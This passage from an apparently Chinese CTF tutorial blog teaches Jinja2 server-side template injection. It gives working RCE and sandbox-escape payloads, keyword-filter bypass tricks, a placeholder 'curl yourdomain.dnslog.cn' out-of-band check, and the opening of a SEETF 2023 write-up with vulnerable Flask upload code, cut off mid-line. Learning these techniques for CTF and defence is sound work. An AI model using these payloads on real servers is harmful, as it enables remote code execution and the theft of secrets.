+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; &quot;ls&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这时你可以<strong>绕过</strong>，用 Python 的字符串构造方式。</p>
+<h4 id="方法一：用-chr-拼接字符串"><a href="#方法一：用-chr-拼接字符串" class="headerlink" title="方法一：用 chr() 拼接字符串"></a>方法一：用 <code>chr()</code> 拼接字符串</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;.join([chr(108), chr(115)]) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>→ 这会拼出字符串 <code>&quot;ls&quot;</code></p>
+<ul>
+<li>108 是 <code>&#39;l&#39;</code></li>
+<li>115 是 <code>&#39;s&#39;</code></li>
+</ul>
+<p>你可以用这种方法拼出任意命令，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; &#x27;&#x27;.join([chr(99),chr(97),chr(116),chr(32),chr(47),chr(102),chr(108),chr(97),chr(103)]) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>→ 拼出 <code>cat /flag</code></p>
+<h4 id="方法二：用已知字符串切片"><a href="#方法二：用已知字符串切片" class="headerlink" title="方法二：用已知字符串切片"></a>方法二：用已知字符串切片</h4><p>你还可以用已有的字符串来切，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &quot;class&quot;[0] + &quot;open&quot;[1] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>→ 拼出 <code>&#39;co&#39;</code></p>
+<p>也可以写成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; (&#x27;abcde&#x27;*100)[100] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>→ 输出某个你想要的字符（用于更复杂绕过）</p>
+<h2 id="Jinja2-的沙箱逃逸和函数调用技巧（进阶-SSTI）"><a href="#Jinja2-的沙箱逃逸和函数调用技巧（进阶-SSTI）" class="headerlink" title="Jinja2 的沙箱逃逸和函数调用技巧（进阶 SSTI）"></a>Jinja2 的沙箱逃逸和函数调用技巧（进阶 SSTI）</h2><p>在一些环境下，Jinja2 可能启用了“沙箱模式”，意思是：</p>
+<p>虽然有模板注入点，但模板语法的功能被“限制”了，不能直接访问敏感对象，比如 <code>__class__</code>、<code>__subclasses__()</code>、<code>os</code> 等。</p>
+<p>这一部分我们讲的就是：<strong>如何在沙箱环境中逃逸出来，继续执行命令或读取文件</strong>。</p>
+<h3 id="什么是沙箱（sandbox）？"><a href="#什么是沙箱（sandbox）？" class="headerlink" title="什么是沙箱（sandbox）？"></a>什么是沙箱（sandbox）？</h3><p>沙箱模式通常启用了一些保护：</p>
+<ul>
+<li>不允许访问双下划线变量（<code>__xxx__</code>）</li>
+<li>不允许访问 Python 的内建函数（如 <code>open()</code>、<code>eval()</code>）</li>
+<li>不允许访问系统模块（如 <code>os</code>、<code>subprocess</code>）</li>
+</ul>
+<p>但其实这些保护并不牢靠，如果存在漏洞，我们可以<strong>通过 Jinja2 本身的模板语法逃逸出去</strong>。</p>
+<h3 id="函数调用逃逸技巧"><a href="#函数调用逃逸技巧" class="headerlink" title="函数调用逃逸技巧"></a>函数调用逃逸技巧</h3><p>Jinja2 本身会阻止你访问 <code>__class__</code>，但它不会阻止你使用 <code>attr()</code> 或 <code>getitem()</code> 等模板函数。</p>
+<p>示例：用 <code>attr()</code> 调用被限制的属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[1].__subclasses__() &#125;&#125;   ← 可能被禁用</span><br><span class="line"></span><br><span class="line">但你可以绕过成：</span><br><span class="line"></span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__ | attr(&#x27;__mro__&#x27;) | attr(&#x27;__getitem__&#x27;)(1) | attr(&#x27;__subclasses__&#x27;)() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>→ 作用和前面一样，但语法更隐蔽，容易绕过 WAF 或沙箱检查。</p>
+<p><strong>沙箱逃逸经典 payload（FileSystemLoader 漏洞）</strong></p>
+<p>如果你发现 Jinja2 模板上下文中包含了 <code>**environment**</code>，那你就有很大机会逃逸！</p>
+<p>比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; self &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&lt;TemplateReference &#x27;index.html&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那你可以尝试访问它的环境对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; self.environment &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后构造 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; self.environment.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析：</p>
+<ul>
+<li><code>self.environment</code> 是当前模板环境</li>
+<li><code>. __class__.__init__.__globals__</code> 能拿到环境构造函数的全局变量</li>
+<li>其中包含了 <code>os</code> 模块</li>
+<li><code>.popen(&#39;ls&#39;).read()</code> 就是执行命令并读取结果！</li>
+</ul>
+<h2 id="SSTI-实战技巧与练习方向"><a href="#SSTI-实战技巧与练习方向" class="headerlink" title="SSTI 实战技巧与练习方向"></a>SSTI 实战技巧与练习方向</h2><h3 id="出题人常用的-SSTI-套路"><a href="#出题人常用的-SSTI-套路" class="headerlink" title="出题人常用的 SSTI 套路"></a>出题人常用的 SSTI 套路</h3><table>
+<thead>
+<tr>
+<th>套路编号</th>
+<th>描述</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>T1</td>
+<td><strong>回显明显</strong></td>
+<td>输入框或参数直接回显，容易发现漏洞</td>
+</tr>
+<tr>
+<td>T2</td>
+<td><strong>绕过黑名单</strong></td>
+<td>限制了 <code>__class__</code><br/>、<code>subprocess</code><br/>、<code>os</code><br/> 等关键字</td>
+</tr>
+<tr>
+<td>T3</td>
+<td><strong>没有回显</strong></td>
+<td>命令执行成功了但没有输出，要用 DNSlog 或文件落地判断</td>
+</tr>
+<tr>
+<td>T4</td>
+<td><strong>模板拼接漏洞</strong></td>
+<td>代码用字符串拼接模板，而不是传入变量</td>
+</tr>
+<tr>
+<td>T5</td>
+<td><strong>Jinja2 非主线利用</strong></td>
+<td>不让你用 <code>__subclasses__()</code><br/>，得用其他方式 RCE，比如 <code>eval</code><br/>、<code>get_flashed_messages</code></td>
+</tr>
+</tbody></table>
+<h3 id="解题流程建议（新手通用）"><a href="#解题流程建议（新手通用）" class="headerlink" title="解题流程建议（新手通用）"></a>解题流程建议（新手通用）</h3><ol>
+<li><strong>观察页面功能</strong>：有没有输入框、参数能被展示出来？</li>
+<li><strong>测试表达式执行</strong>：尝试 <code>&#123;&#123;7*7&#125;&#125;</code> 看是否变成 49</li>
+<li><strong>确认是哪个模板引擎</strong>：常见如 Jinja2、Twig、Velocity，先猜是 Jinja2</li>
+<li><strong>判断是否存在限制</strong>：尝试 <code>.__class__</code> 或 <code>.__mro__</code> 是否报错</li>
+<li><strong>构造命令执行 payload</strong>：用 <code>.subclasses__()</code> + <code>Popen</code>，或环境对象绕过</li>
+<li><strong>没有回显怎么办？</strong>：<ul>
+<li>尝试命令写文件 <code>/tmp/a.txt</code></li>
+<li>尝试 DNS 查询 <code>curl yourdomain.dnslog.cn</code></li>
+<li>用 <code>whoami</code>、<code>id</code>、<code>pwd</code> 这类命令调试</li>
+</ul>
+</li>
+</ol>
+<h3 id="构造更强大的-Payload（读取变量、RCE-等）"><a href="#构造更强大的-Payload（读取变量、RCE-等）" class="headerlink" title="构造更强大的 Payload（读取变量、RCE 等）"></a><strong>构造更强大的 Payload（读取变量、RCE 等）</strong></h3><p>在这一部分，我们要开始从简单的 <code>&#123;&#123;7*7&#125;&#125;</code>，<strong>升级到更复杂、更危险的利用</strong>，例如：</p>
+<ul>
+<li>读取服务器上的 Python 变量</li>
+<li>执行系统命令（比如 <code>ls</code>、<code>cat /flag</code>）</li>
+<li>绕过一些黑名单</li>
+</ul>
+<hr>
+<p>🔍 第一步：了解你可以访问什么变量</p>
+<p>SSTI 的一个核心点是：你可以访问 Jinja2 模板中的变量。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">Hello &#123;&#123; user &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个模板在后端执行时，如果传入了 <code>user=&quot;小明&quot;</code>，就会显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">Hello 小明</span><br></pre></td></tr></table></figure>
+
+<p>但是如果你<strong>控制了模板内容</strong>，就可以尝试访问其他变量，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; config &#125;&#125;</span><br><span class="line">&#123;&#123; request &#125;&#125;</span><br><span class="line">&#123;&#123; self &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这些变量如果存在，你就能拿到其中的值，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; request.args &#125;&#125;  → URL 参数</span><br><span class="line">&#123;&#123; config.items() &#125;&#125; → Flask 配置（有 SECRET_KEY 等）</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>第二步：利用 Python 对象属性穿透执行命令（RCE）</p>
+<p>我们目标是：拿到一个系统函数，比如 <code>os.system()</code>，然后执行命令！</p>
+<p><strong>关键利用链：</strong></p>
+<p>我们要想办法，从模板中找出一个“函数”，然后不断调用属性或方法，最终找到 <code>os.system</code> 这种“可利用”的危险函数。</p>
+<p>经典链条（Jinja2专属）是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>🔍 解释一下：</p>
+<ul>
+<li><code>&#39;&#39;</code> 是一个空字符串</li>
+<li><code>.__class__</code> 是它的类，字符串的类是 <code>&lt;class &#39;str&#39;&gt;</code></li>
+<li><code>.__mro__</code> 是“方法解析顺序”，可以获取其父类</li>
+<li><code>[1]</code> 是 <code>&lt;class &#39;object&#39;&gt;</code></li>
+<li><code>.__subclasses__()</code> 是 object 的所有子类（系统内建的类）</li>
+</ul>
+<p>这些子类中有个叫 <code>&lt;class &#39;subprocess.Popen&#39;&gt;</code> 的类。</p>
+<p>我们就可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[&lt;index&gt;](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个 payload 会执行系统命令 <code>ls</code>，并返回输出！</p>
+<hr>
+<p>怎么找 index？</p>
+<p>你可以先把所有子类都列出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后尝试找出 <code>subprocess.Popen</code> 所在的位置，比如说是第 392 个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[392](&#x27;ls&#x27;, shell=True, stdout=-1).communicate()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>补充：Jinja2 自带的一些危险函数</p>
+<p>你也可以用一些 Jinja2 暴露出来的函数，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; config &#125;&#125;</span><br><span class="line">&#123;&#123; cycler.__init__.__globals__.os.popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这条链很出名，用的是 <code>cycler</code> 的 <code>__globals__</code> 字典获取 <code>os</code> 模块。</p>
+<hr>
+<p>实践建议：</p>
+<p>你可以现在在题目中尝试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看看能不能列出所有类，或者用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; config.items() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>试图读一些配置变量。</p>
+<h2 id="WAF-绕过技巧（过滤字符怎么继续打-SSTI）"><a href="#WAF-绕过技巧（过滤字符怎么继续打-SSTI）" class="headerlink" title="WAF 绕过技巧（过滤字符怎么继续打 SSTI）"></a><strong>WAF 绕过技巧（过滤字符怎么继续打 SSTI）</strong></h2><p>有些比赛或实际应用，为了防御 SSTI，会设置 WAF（Web 应用防火墙），<strong>过滤某些关键字符</strong>，比如：</p>
+<ul>
+<li><code>__</code>（双下划线）</li>
+<li><code>()</code>（小括号）</li>
+<li><code>[]</code>（中括号）</li>
+<li><code>.</code>（点）</li>
+<li><code>import</code>、<code>os</code>、<code>eval</code> 等关键词</li>
+</ul>
+<hr>
+<p>目标：绕过这些字符限制，依然执行 SSTI Payload</p>
+<p>下面是几种常用的绕过思路：</p>
+<hr>
+<ol>
+<li>利用 <code>attr()</code> 函数绕过 <code>.属性名</code></li>
+</ol>
+<p>在 Jinja2 中，你可以用 <code>attr()</code> 代替点运算符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[1] &#125;&#125;  ❌ 被过滤了点</span><br><span class="line"></span><br><span class="line">✅ 可以写成：</span><br><span class="line">&#123;&#123; &#x27;&#x27;.|attr(&#x27;__class__&#x27;)|attr(&#x27;__mro__&#x27;)[1] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>或者更通用地写成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; getattr(&#x27;&#x27;, &#x27;__class__&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<ol start="2">
+<li>利用 <code>|attr()</code> 和 <code>|replace()</code> 绕过 <code>__</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; &#x27;&#x27;.|attr(&#x27;__class__&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果过滤了 <code>__</code>，我们可以自己拼出它：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; &#x27;&#x27;.|attr(&#x27;_&#x27; + &#x27;_&#x27; + &#x27;class&#x27; + &#x27;_&#x27; + &#x27;_&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; &#x27;&#x27;.|attr(&#x27;__class__&#x27;.replace(&#x27;C&#x27;, &#x27;c&#x27;)) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<ol start="3">
+<li>利用 <code>join()</code> &#x2F; <code>ljust()</code> 拼接关键字</li>
+</ol>
+<p>举例：过滤了 <code>os</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; cycler.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果过滤了 <code>()</code>，可以用 <code>|attr</code> 找到 <code>.read</code> 方法，然后用 <code>|safe</code> 或 <code>|join</code> 拼接后调用。</p>
+<hr>
+<ol start="4">
+<li>利用 <code>dict</code>、<code>mro</code>、<code>subclasses()</code> 结合循环尝试找目标类</li>
+</ol>
+<p>比如你无法写出完整的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[392]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>你可以遍历：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;% for cls in &#x27;&#x27;.__class__.__mro__[1].__subclasses__() %&#125;</span><br><span class="line">  &#123;% if &#x27;subprocess&#x27; in cls.__module__ %&#125;</span><br><span class="line">    &#123;&#123; cls &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<ol start="5">
+<li>用 safe 过滤器解码 HTML 实体字符</li>
+</ol>
+<p>有些场景中过滤器把 <code>&lt;</code> 和 <code>&gt;</code> 编码了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123;7*7&#125;&#125; → &#123;&#123;7*7&#125;&#125; → 输出：49</span><br><span class="line">&#123;&#123;7*7|safe&#125;&#125; → 强制让输出原样返回</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="🎯-重点总结"><a href="#🎯-重点总结" class="headerlink" title="🎯 重点总结"></a>🎯 重点总结</h2><table>
+<thead>
+<tr>
+<th>绕过目标</th>
+<th>替代技巧</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>.</code><br/> 点号</td>
+<td><code>attr()</code><br/>、<code>getattr()</code></td>
+</tr>
+<tr>
+<td><code>__</code></td>
+<td>拼接字符串、<code>replace()</code></td>
+</tr>
+<tr>
+<td><code>()</code></td>
+<td>用 &#96;</td>
+</tr>
+<tr>
+<td><code>[]</code></td>
+<td>用 <code>loop</code><br/>、<code>for</code><br/> 遍历对象</td>
+</tr>
+<tr>
+<td><code>os</code></td>
+<td>用拼接：<code>&#39;o&#39;+&#39;s&#39;</code></td>
+</tr>
+<tr>
+<td><code>import</code></td>
+<td>用 <code>__import__()</code><br/>、拼接、内建遍历等</td>
+</tr>
+</tbody></table>
+<h1 id="SEETF-2023-File-Uploader-1"><a href="#SEETF-2023-File-Uploader-1" class="headerlink" title="[SEETF 2023]File Uploader 1"></a>[SEETF 2023]File Uploader 1</h1><p><a target="_blank" rel="noopener" href="https://hackmd.io/@itami/r1BPWhSwn#2file-uploader-1">https:&#x2F;&#x2F;hackmd.io&#x2F;@itami&#x2F;r1BPWhSwn#2file-uploader-1</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if the post request has the file part</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If the user does not select a file, the browser submits an empty file without a filename.</span></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    fileext = get_fileext(file.filename)</span><br><span class="line"></span><br><span class="line">    file.seek(<span class="number">0</span>, <span class="number">2</span>) <span class="comment"># seeks the end of the file</span></span><br><span class="line">    filesize = file.tell() <span class="comment"># tell at which byte we are</span></span><br><span class="line">    file.seek(<span class="number">0</span>, <span class="number">0</span>) <span class="comment"># go back to the beginning of the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> fileext <span class="keyword">and</span> filesize &lt; <span class="number">10</span>*<span class="number">1024</span>*<span class="number">1024</span>:</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&#x27;ext&#x27;</span>] <span class="keyword">and</span> os.path.exists(os.path.join(UPLOAD_FOLDER, session[<span class="string">&#x27;uuid&#x27;</span>]+<span class="string">&quot;.&quot;</span>+session[<span class="string">&#x27;ext&#x27;</span>])):</span><br><span class="line">            os.remove(os.path.join(UPLOAD_FOLDER, session[<span class="string">&#x27;uuid&#x27;</span>]+<span class="string">&quot;.&quot;</span>+session[<span class="string">&#x27;ext&#x27;</span>]))</span><br><span class="line">        session[<span class="string">&#x27;ext&#x27;</span>] = fileext</span><br><span class="line">        filename = session[<span class="string">&#x27;uuid&#x27;</span>]+<span class="string">&quot;.&quot;</span>+session[<span class="string">&#x27;ext&#x27;</span>]</span><br><span class="line">        file.save(os.path.join(UPLOAD_FOLDER, filename))</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            <span class="subst">&#123;file.filename&#125;</span> is not valid because it is too big or has the wrong extension</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        l1 = 